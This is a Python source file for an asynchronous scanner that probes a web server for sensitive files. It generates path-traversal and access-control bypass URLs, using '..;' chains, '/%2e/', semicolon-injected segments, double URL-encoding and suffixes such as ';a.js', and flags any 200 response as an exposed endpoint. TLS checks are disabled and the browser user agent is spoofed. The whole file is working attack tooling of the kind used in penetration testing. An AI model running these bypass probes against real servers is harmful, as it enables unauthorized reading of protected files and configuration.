import argparse
import logging
import asyncio
import difflib
import itertools
import random
import ssl
import re
import string
import warnings
import http.cookies
from urllib.parse import urljoin

import aiohttp
import yarl
from colorama import Fore
from yarl import URL

# skip charset_normalizer warning
warnings.filterwarnings("ignore", category=UserWarning, module='charset_normalizer')

# fix cookie error: illegal key
http.cookies._is_legal_key = lambda _: True

# logger configuration && save results
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[logging.FileHandler("results.log"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

# Timeout configuration
TIMEOUT = 3


class Fetcher:
    def __init__(self, url, session, semaphore, base_url, tried_requests_counter, counter_lock,
                 diff_length, logged_lengths):
        self.logged_lengths = logged_lengths
        self.url = url
        self.session = session
        self.semaphore = semaphore
        self.base_url = base_url
        self.tried_requests_counter = tried_requests_counter
        self.counter_lock = counter_lock
        self.diff_length = diff_length
        self.logged_lengths = logged_lengths

    async def fetch(self):
        async with self.semaphore:
            try:
                timeout = aiohttp.ClientTimeout(total=TIMEOUT)
                # support contain ../
                self.url = yarl.URL(self.url, encoded=True)
                # disable redirect
                async with self.session.get(self.url, timeout=timeout, allow_redirects=False) as response:
                    content_length = response.headers.get('Content-Length')
                    if content_length is not None:
                        size = int(content_length)
                    else:
                        size = 0
                        async for data in response.content.iter_any():
                            size += len(data)
                    logger.debug(f"[DEBUG] Trying {self.url}")
                    # log redirect url
                    if 'location' in str(response).lower():
                        logger.debug(f"[DEBUG] Redirect {self.url}")
                    if response.status == 200:
                        #  sensitive files if the content does not match the content of base_url
                        if not Util.is_similar(size, self.logged_lengths):
                            self.logged_lengths.append(size)
                            logger.info(
                                Fore.RED + f"[+] Sensitive endpoint found: {self.url}" + Fore.RESET + Fore.CYAN + f" Size: {Util.common_size(size)}" + Fore.RESET)
                            return True
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"[-] An error occurred while requesting {self.url}: {type(e).__name__} - {e}")
                return False
            finally:
                # requests_counter
                await Util.increment_counter()


class PathChecker:
    @staticmethod
    async def get_not_found_indicator(base_url, session):
        not_found_path = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
        not_found_url = urljoin(base_url, not_found_path)
        async with session.get(not_found_url, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as response:
            try:
                not_found_indicator = await response.text()
            except UnicodeDecodeError:
                # pass
                not_found_indicator = ""
            return not_found_indicator

    @staticmethod
    async def check_path_exists(base_url, path, session, semaphore, not_found_indicator):
        """
        Check valid path
        """
        if not not_found_indicator:
            return False

        url = urljoin(base_url, path)
        async with semaphore:
            try:
                timeout = aiohttp.ClientTimeout(total=TIMEOUT)
                async with session.get(url, timeout=timeout) as response:
                    try:
                        text = await response.text()
                        if not text:
                            return False
                    except UnicodeDecodeError:
                        # pass
                        return False

                    similarity = difflib.SequenceMatcher(None, text, not_found_indicator).ratio()
                    # compare similarity
                    return similarity < 0.9
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"[-] An error occurred while checking {url}: {type(e).__name__} - {e}")
                return False


class RuleGenerator:
    @staticmethod
    def generate_bypass_rules(normal_path):
        """
        Set of bypass rules
        """
        segments = normal_path.strip("/").split("/")
        # Rules based on path matching ..;
        max_dots = len(segments) + 1

        # Rules based on path matching ..;
        bypass_rules = ["/".join(["..;"] * i) for i in range(1, max_dots + 1)]

        bypass_rules.append("/images/../")

        bypass_rules.append("/%2e/")

        random_chars = "".join(random.choices(string.ascii_lowercase, k=3))

        # Path addition /;/ Random character rules
        modified_rules = [rule.replace("/", f"/;{random_chars}/", 1) + f";{random_chars}" for rule in bypass_rules]
        bypass_rules.extend(modified_rules)

        # Adding '..' rules
        bypass_rules.extend(["/".join([".."] * i) for i in range(max_dots + 1)])

        # Remove duplicates in rule set
        return list(dict.fromkeys(bypass_rules))


class Detector:
    def __init__(self, base_url, normal_paths, sensitive_files, concurrency, check_existence):
        self.check_existence = check_existence
        self.concurrency = concurrency
        self.sensitive_files = sensitive_files
        self.normal_paths = normal_paths
        self.base_url = base_url

        self.sslcontext = ssl.create_default_context()
        self.sslcontext.check_hostname = False
        self.sslcontext.verify_mode = ssl.CERT_NONE

        self.connector = aiohttp.TCPConnector(ssl=self.sslcontext)
        # common headers may be configuration later
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/112.0.0.0 Safari/537.3",
            "Content-Type": "application/json",
            "Accept": "*/*"
        }

        self.diff_length = {}
        self.size_differences = {}
        self.tried_requests_counter = 0
        self.counter_lock = asyncio.Lock()
        self.logged_lengths = []

    async def check_url(self, url, session, semaphore):
        checked_urls = set()
        if url not in checked_urls:
            checked_urls.add(url)
            fetcher = Fetcher(url, session, semaphore, self.base_url,
                              self.tried_requests_counter, self.counter_lock, self.diff_length,
                              self.logged_lengths)
            return await fetcher.fetch()
        return False

    async def generate_all_urls(self, not_found_indicator, session, semaphore):
        # if normal_path is empty, then skip
        for normal_path in self.normal_paths:
            if not normal_path:
                continue
            # if check path then skip
            if self.check_existence and not await PathChecker.check_path_exists(self.base_url, normal_path, session,
                                                                                semaphore,
                                                                                not_found_indicator):
                continue
            # Rule generation
            bypass_rules = RuleGenerator.generate_bypass_rules(normal_path)
            async for url in self.generate_url_combinations(bypass_rules, self.sensitive_files, normal_path):
                yield url

    async def generate_url_combinations(self, bypass_rules, sensitive_files, normal_path):
        for bypass_rule, sensitive_file in itertools.product(bypass_rules, sensitive_files):
            url_path = f"{normal_path}/{bypass_rule}/{sensitive_file}".replace("//", '/')
            url = self.base_url.rstrip('/') + '/' + url_path.lstrip('/')
            yield url

    async def run(self):
        async with aiohttp.ClientSession(headers=self.headers, connector=self.connector) as session:
            semaphore = asyncio.Semaphore(self.concurrency)

            not_found_indicator = None
            if self.check_existence:
                not_found_indicator = await PathChecker.get_not_found_indicator(self.base_url, session)

            tasks = [self.check_url(url, session, semaphore) async for url in
                     self.generate_all_urls(not_found_indicator, session, semaphore)]

            results = await asyncio.gather(*tasks, return_exceptions=True)

            if not any(results):
                logger.info(f"[-] No sensitive files were found: " + Fore.GREEN + self.base_url + Fore.RESET)


class Util:
    """
    all util methods
    """
    _counter = 0
    _lock = asyncio.Lock()

    @staticmethod
    async def increment_counter():
        async with Util._lock:
            Util._counter += 1

    @staticmethod
    def get_counter():
        return Util._counter

    @staticmethod
    def is_similar(new_length, existing_lengths, tolerance=0.05):  # 5% tolerance
        for length in existing_lengths:
            if abs(new_length - length) <= tolerance * length:
                return True
        return False

    @staticmethod
    def normalize_url(url):
        """
        URL normalization
        """
        # Parse the URL
        parsed_url = URL(url)
        # Remove the parameters from the path and reduce multiple slashes to one
        cleaned_path = re.sub(r'/+', '/', '/'.join([part.split(';')[0] for part in parsed_url.path.split('/')]))
        # Construct the cleaned URL
        cleaned_url = URL.build(
            scheme=parsed_url.scheme,
            host=parsed_url.host,
            path=cleaned_path,
            query=parsed_url.query,
            fragment=parsed_url.fragment,
            user=parsed_url.user,
            password=parsed_url.password,
            port=parsed_url.port
        )
        return str(cleaned_url)

    @staticmethod
    def common_size(num):
        """
        readable size
        """
        units = ["B ", "KB", "MB", "GB"]
        base = 1024
        for i, unit in enumerate(units):
            if abs(num) < base:
                return f"{num:.2f}{unit}"
            num /= base
        return f"{num:.2f}TB"

    @staticmethod
    def load_dictionary(file_path):
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]

    @staticmethod
    def url_encode_all(string):
        """
        URL encoding supporting all characters
        """
        return "".join("%{:02x}".format(ord(char)) for char in string)

    @staticmethod
    def apply_encoding_rules(rule):
        """
        Dicts urlencoding
        """
        if not rule:
            return []

        char_to_encode = random.choice(rule)
        encoded_char = Util.url_encode_all(char_to_encode)
        double_encoded_char = Util.url_encode_all(encoded_char)

        return [rule.replace(char_to_encode, encoded_char), rule.replace(char_to_encode, double_encoded_char)]

    @staticmethod
    def apply_encoding_and_extend(dictionary_items, extensions=None):
        """
        Dictionary path encoding processing
        """
        encoded_items = set().union(*[Util.apply_encoding_rules(item) for item in dictionary_items])

        extended_items = [item + ext for item in (set(dictionary_items) | encoded_items) for ext in
                          (extensions or [""])]

        return extended_items


class Configuration:
    def __init__(self):
        self.args = self.parse_arguments()

    @staticmethod
    def parse_arguments():
        """
        Parse command line arguments
        """
        parser = argparse.ArgumentParser(description="Sensitive information detector.")
        parser.add_argument("base_url", help="The base URL to scan.")
        parser.add_argument("normal_paths_dict", help="Path to the normal paths dictionary.")
        parser.add_argument("sensitive_files_dict", help="Path to the sensitive files dictionary (optional).")
        parser.add_argument("-c", "--concurrency", type=int, default=5, help="Concurrency level (default: 5).")
        parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")
        parser.add_argument("-e", "--check-existence", action="store_true",
                            help="Check if the paths exist before scanning.")
        args = parser.parse_args()
        if args.verbose:
            logger.setLevel(logging.DEBUG)

        return args


def main():
    try:
        config = Configuration()

        # Import dictionaries
        normal_paths = Util.load_dictionary(config.args.normal_paths_dict)
        sensitive_files = Util.load_dictionary(config.args.sensitive_files_dict)

        # normal_paths = Util.apply_encoding_and_extend(normal_paths)
        # Extended suffix configuration .json , ;a.js
        sensitive_files = Util.apply_encoding_and_extend(sensitive_files, extensions=["", ".json", ";a.js", ";%2f..%2f..%2f%2f"])

        detector = Detector(config.args.base_url, normal_paths, sensitive_files, config.args.concurrency,
                            config.args.check_existence)

    except Exception as e:
        logger.error(f"Failed to initialize the Detector: {e}")
        return

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(detector.run())
    except asyncio.TimeoutError:
        pass
    finally:
        logger.debug(Fore.BLUE + f"[DEBUG] Total tried requests:" + str(Util.get_counter()) + Fore.RESET)
        loop.close()


if __name__ == '__main__':
    main()
